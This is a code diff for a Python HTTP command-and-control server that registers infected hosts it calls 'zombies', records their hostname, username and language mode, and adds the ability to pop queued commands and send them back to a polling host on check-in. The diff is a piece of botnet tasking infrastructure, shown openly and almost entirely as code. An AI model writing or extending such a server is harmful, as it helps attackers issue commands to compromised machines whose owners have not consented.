@@ -22,6 +22,7 @@ def process_zombie_checkin(json_object, public_ip):
 	hostname = data['hostname']
 	username = data['username']
 	clm = data['clm']
+	json_response = '{}'
 	# If zombie is not registered, create it
 	# else update check in time
 	if not any(z.uuid == uuid for z in zombies):
@@ -29,6 +30,12 @@ def process_zombie_checkin(json_object, public_ip):
 	else:
 		z = next((z for z in zombies if z.uuid == uuid), None)
 		z.update_check_in_time()
+		print(z.command_cue)
+		if len(z.command_cue) > 0:
+			command = z.command_cue.pop()
+			print(command)
+			json_response = '{"command":"'+command+'"}'
+	return json_response
 
 
 
@@ -41,7 +48,7 @@ class PostHandler(BaseHTTPRequestHandler):
         # Get public IP
         public_ip = self.client_address[0]
         # JSON data given by the zombie
-        process_zombie_checkin(json_object, public_ip)
+        json_response = process_zombie_checkin(json_object, public_ip)
 
         # Begin the response
         self.send_response(200)
@@ -55,9 +62,9 @@ class PostHandler(BaseHTTPRequestHandler):
             line_buffering=False,
             write_through=True,
         )
-
+	
         # Echo back information about what was posted in the form
-        out.write(str(json_object))
+        out.write(str(json_response))
 
         # Disconnect our encoding wrapper from the underlying
         # buffer so that deleting the wrapper doesn't close
